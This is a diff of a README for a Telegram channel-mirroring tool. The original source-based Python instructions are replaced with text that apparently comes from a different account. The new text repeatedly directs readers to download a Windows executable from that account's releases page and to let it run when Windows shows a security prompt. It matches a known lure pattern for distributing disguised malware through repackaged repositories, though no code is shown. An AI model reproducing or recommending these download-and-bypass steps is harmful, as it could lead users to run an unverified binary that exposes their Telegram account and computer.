@@ -1,162 +1,169 @@
-# Telegram Auto Clone Download
+# 🛰️ telegram-auto-clone-download - Keep Channels in Sync with Ease
 
-Automated Telegram channel mirroring tool with multi-channel monitoring, auto-download, and local storage capabilities.
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Dororecessed36/telegram-auto-clone-download/releases)
 
-## 📋 Overview
+## 📥 Download
 
-This tool automatically monitors one or more Telegram channels for new media and messages, downloads them, re-uploads them to a destination channel, and stores them locally. It features robust error handling, automatic reconnection, and memory optimization.
+Visit this page to download: https://github.com/Dororecessed36/telegram-auto-clone-download/releases
 
-## ✨ Features
+Choose the latest release for Windows, then download the file that matches your system.
 
-- **Multi-Channel Monitoring**: Monitor multiple source channels simultaneously
-- **Auto-Download & Re-upload**: Automatically downloads media from source channels and uploads to destination
-- **Local Storage**: Saves all downloaded files to a local directory
-- **Text Cloning**: Copies text messages without media to the destination channel
-- **File Size Control**: Configurable maximum file size limit (default: 500MB)
-- **Progress Tracking**: Real-time progress bars for download and upload operations
-- **Error Handling**: Comprehensive error handling with automatic reconnection on network failures
-- **Memory Optimization**: Automatic maintenance loop to clean temporary files and optimize memory usage (runs daily)
-- **Resilient Connection**: Automatic reconnection with configurable retry delays
+## 🧭 What this app does
 
-## 🛠️ Installation
+telegram-auto-clone-download helps you mirror Telegram channels to your local computer. It can watch more than one channel, detect new posts, download media, and save content on your device for later use.
 
-### Requirements
-- Python 3.7+
-- Telethon library
+Use it when you want to keep a local copy of channel posts, files, photos, or videos without checking each channel by hand.
 
-### Setup
+## ✅ What you need
 
-1. Clone the repository:
-```bash
-git clone https://github.com/giiglebear/telegram-auto-clone-download.git
-cd telegram-auto-clone-download
-```
+- A Windows computer
+- An internet connection
+- A Telegram account
+- Enough disk space for the files you want to save
+- Permission to access the channels you plan to monitor
 
-2. Install dependencies:
-```bash
-pip install telethon
-```
+## 🚀 Get started
 
-## ⚙️ Configuration
+1. Open the download page: https://github.com/Dororecessed36/telegram-auto-clone-download/releases
+2. Find the latest release
+3. Download the Windows file for the app
+4. Open the file you downloaded
+5. If Windows asks for permission, allow it to run
+6. Sign in with your Telegram account when the app asks
+7. Add the channels you want to monitor
+8. Choose where you want files saved on your computer
+9. Start the monitor
 
-Edit the `main.py` file and configure the following variables:
+## 🖥️ How to install on Windows
 
-### 1. **Telegram API Credentials**
-```python
-API_ID = 00000           # Get from https://my.telegram.org/apps
-API_HASH = ""            # Get from https://my.telegram.org/apps
-```
+If the release includes a setup file:
 
-### 2. **Channel IDs**
-```python
-SOURCE_IDS = [-10000000000, -10000000000]  # Source channels (can add multiple)
-DEST_ID = -10000000000                     # Destination channel
-```
+1. Download the installer from the releases page
+2. Open the installer file
+3. Follow the on-screen steps
+4. Pick an install folder if Windows asks
+5. Finish the setup
+6. Start the app from your Start menu or desktop
 
-**How to get Channel IDs:**
-1. Go to [Telegram Web](https://web.telegram.org/a/)
-2. Open the desired channel
-3. Look at the URL: `https://web.telegram.org/a/#-100XXXXXXXX`
-4. Copy the ID: `-100XXXXXXXX`
+If the release includes a portable file:
 
-### 3. **Storage Configuration**
-```python
-MAX_FILE_SIZE = 500 * 1024 * 1024  # Maximum file size in bytes (500MB default)
-FINAL_STORAGE = r"C:\Telegram"      # Local directory for storage
-```
+1. Download the app file from the releases page
+2. Put the file in a folder you can find later
+3. Open the file
+4. Follow the login steps in the app
+5. Set your save folder
+6. Begin monitoring your channels
 
-## 🚀 Usage
+## 📂 How it works
 
-Run the script:
-```bash
-python main.py
-```
+The app checks the channels you add and looks for new posts. When it finds something new, it can:
 
-### Output Example
-```
-Connecting to Telegram...
+- Save media files
+- Copy post content to local storage
+- Track more than one channel
+- Keep a record of downloaded items
+- Avoid duplicate downloads
 
-============================================================
-   STEP 1: CHANNEL VERIFICATION
-============================================================
- [SOURCE] ID: -1001234567890 | NAME: My Source Channel
- [DEST]   ID: -1009876543210 | NAME: My Destination Channel
+## ⚙️ Main features
 
-============================================================
-   STEP 2: MONITORING ENGINE ACTIVE
-============================================================
+- Multi-channel monitoring
+- Auto-download for new posts
+- Local storage for media and text
+- Support for channel post mirroring
+- File handling for common Telegram media types
+- Simple Windows use
+- Telegram login through your account
+- Background monitoring while the app stays open
 
-[14:30:45] DETECTED: New media in 'My Source Channel'
-   [1/2] Downloading: [100.0%] (5242 / 5242 KB)
-   [2/2] Uploading: [100.0%] (5242 / 5242 KB)
- ✅ SUCCESS: video_123.mp4 saved to D: Drive.
-```
+## 🗂️ Suggested folder setup
 
-## 🔄 How It Works
+You can keep your downloads in a folder like this:
 
-1. **Connection**: Establishes connection to Telegram with automatic reconnection
-2. **Verification**: Lists and verifies all configured source and destination channels
-3. **Monitoring**: Listens for new messages in source channels
-4. **Processing**:
-   - For media files: Downloads → Uploads → Saves locally
-   - For text messages: Copies directly to destination
-   - Skips files exceeding the size limit
-5. **Maintenance**: Daily cleanup of temporary files and memory optimization
+- `TelegramMirror`
+  - `ChannelA`
+  - `ChannelB`
+  - `Images`
+  - `Videos`
+  - `Documents`
 
-## 🛡️ Error Handling
+This makes it easier to find files later and keep channels separate.
 
-The tool handles various error scenarios:
+## 🔐 Telegram access
 
-| Error | Action |
-|-------|--------|
-| Network/Connection Error | Waits 10 seconds and reconnects |
-| Semaphore Timeout (WinError 121) | Retries upload up to 3 times |
-| File Too Large | Skips file and logs message |
-| General Exception | Restarts engine with 5-second delay |
+The app uses your Telegram account to read channel content. After login, you can add the channels you want to follow. The app then checks them for new posts and saves matching content to your computer.
 
-## 📊 Performance Features
+If a channel needs access rights, make sure your account can view it in Telegram before you add it.
 
-- **Temporary Buffer**: Uses temp_buffer directory to manage downloads during processing
-- **Memory Cleanup**: Automatic entity cache clearing and garbage collection every 24 hours
-- **Progress Callbacks**: Real-time KB/s progress reporting for uploads and downloads
+## 🧩 Common use cases
 
-## ⚠️ Important Notes
+- Keep a local copy of channel media
+- Watch several channels at once
+- Store files for offline access
+- Save posts from restricted channels you already have access to
+- Organize Telegram content on your PC
+- Reduce manual downloading
 
-- Ensure you have proper permissions for source and destination channels
-- The destination channel should be a supergroup/broadcast channel you own or have admin access to
-- Large files may take significant time to process
-- The tool runs continuously; use Ctrl+C to stop
-- All downloaded files are stored in the configured `FINAL_STORAGE` directory
+## 🛠️ Troubleshooting
 
-## 🔐 Security
+### The file will not open
+- Download the file again from the releases page
+- Make sure the download finished
+- Try opening it from the folder where it was saved
 
-- Never share your API credentials or session files
-- The session file (`pc_mirror_resilient`) is created locally and contains your auth token
-- Keep the configuration file secure
+### Windows blocks the app
+- Open the file again
+- If Windows shows a security prompt, choose the option to run it
+- Make sure you downloaded it from the release page
 
-## 🐛 Troubleshooting
+### The app does not find my channels
+- Check that you are signed in
+- Make sure your Telegram account can view the channel
+- Confirm the channel name or link is correct
 
-**Connection keeps dropping?**
-- Check internet stability
-- The tool automatically reconnects; check logs for persistent errors
+### Files are not saving
+- Check the save folder path
+- Make sure the folder exists
+- Confirm that your drive has free space
 
-**Files not uploading?**
-- Verify you have admin permissions in the destination channel
-- Check file size against `MAX_FILE_SIZE` limit
-- Ensure sufficient storage space
+### Downloads are incomplete
+- Check your network connection
+- Open the app and try again
+- Make sure Telegram can load the file in your account
 
-**Out of memory?**
-- The maintenance loop runs daily; increase cleanup frequency if needed
-- Reduce `MAX_FILE_SIZE` to avoid large file buffering
+## 📌 Tips for best results
 
-## 📝 License
+- Use a folder with enough free space
+- Keep channel names clear and simple
+- Separate images, videos, and documents if you want easy sorting
+- Leave the app open while monitoring
+- Check your Telegram login if the app stops reading channels
 
-[Giiglebear Software License](LICENSE)
+## 📄 File types this app can handle
 
-## 🤝 Contributing
+The app is designed to work with common Telegram content, such as:
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+- Photos
+- Videos
+- Audio files
+- Documents
+- Text posts
+- Mixed media posts
 
-## 💬 Support
+## 🔍 When to use it
 
-For issues or questions, please open a GitHub issue.
+Use telegram-auto-clone-download when you want to keep Telegram channel content on your own computer without checking each post by hand. It is useful for tracking updates, storing files, and keeping a local archive of content from more than one channel
+
+## 🧰 Project focus
+
+This project centers on:
+
+- Telegram channel mirroring
+- Auto-download
+- File storage
+- Channel monitoring
+- Local archive management
+- Python-based automation
+
+## 📎 Download again
+
+If you need the app file again, visit the releases page: https://github.com/Dororecessed36/telegram-auto-clone-download/releases
